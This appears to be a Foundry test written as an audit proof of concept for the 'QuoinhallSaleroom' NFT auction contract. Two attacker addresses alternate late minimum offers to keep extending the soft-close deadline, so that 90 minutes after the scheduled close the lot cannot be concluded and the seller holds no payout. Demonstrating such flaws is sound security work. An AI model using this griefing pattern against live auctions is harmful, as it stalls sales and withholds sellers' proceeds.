// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {QuoinhallSaleroom} from "../src/QuoinhallSaleroom.sol";

contract MockERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external {}
}

contract SoftClosePoC is Test {
    QuoinhallSaleroom saleroom;
    MockERC721 mockNft;

    address attacker1 = address(0x111);
    address attacker2 = address(0x222);
    address seller = address(0x333);

    function setUp() public {
        saleroom = new QuoinhallSaleroom(address(this), 200);
        mockNft = new MockERC721();
        vm.deal(attacker1, 100 ether);
        vm.deal(attacker2, 100 ether);
    }

    function test_infiniteProlongation() public {
        vm.prank(seller);
        uint256 lotId = saleroom.consign(address(mockNft), 1, 1 ether, 1 hours);

        uint64 initialClose = saleroom.getLot(lotId).closesAt;
        console2.log("Scheduled close:", initialClose);

        vm.warp(initialClose - 10 minutes);

        for (uint256 i = 0; i < 5; i++) {
            address currentAttacker = i % 2 == 0 ? attacker1 : attacker2;
            uint256 minOffer = saleroom.minimumOffer(lotId);
            vm.prank(currentAttacker);
            saleroom.placeOffer{value: minOffer}(lotId);

            uint64 newClose = saleroom.getLot(lotId).closesAt;
            assertEq(newClose, initialClose + uint64((i + 1) * 20 minutes));
            console2.log("Late offer", i + 1, "-> close is now:", newClose);

            vm.warp(newClose - 10 minutes);
        }

        // 90 minutes after the lot was supposed to close it still cannot be concluded
        assertEq(block.timestamp, initialClose + 90 minutes);
        vm.expectRevert(QuoinhallSaleroom.LotStillOpen.selector);
        saleroom.conclude(lotId);

        assertEq(seller.balance, 0);
        console2.log("Seller balance 90 min after the scheduled close:", seller.balance);
    }
}
